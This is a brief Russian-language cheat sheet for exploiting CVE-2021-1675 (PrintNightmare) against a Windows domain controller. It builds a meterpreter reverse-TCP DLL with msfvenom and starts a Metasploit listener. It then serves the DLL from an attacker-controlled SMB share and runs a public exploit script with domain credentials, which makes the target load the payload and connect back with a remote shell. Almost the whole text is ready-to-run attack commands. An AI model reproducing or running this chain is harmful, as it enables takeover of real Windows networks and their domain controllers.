

Создаем файл с полезной нагрузкой
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=100.100.93.222 LPORT=6655 -f dll -o /tmp/unl.dll

Открывает слушателя metasploit
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 100.100.2.252
set LPORT 6655
run

Создаем смб сервер
impacket-smbserver tmp /tmp -smb2support

Запускаем скрипт  (https://github.com/cube0x0/CVE-2021-1675)
python3 CVE-2021-1675.py name_domain_controller.name_domain/User:123456@10.10.0.12 '\\100.100.2.252\tmp\unl.dll'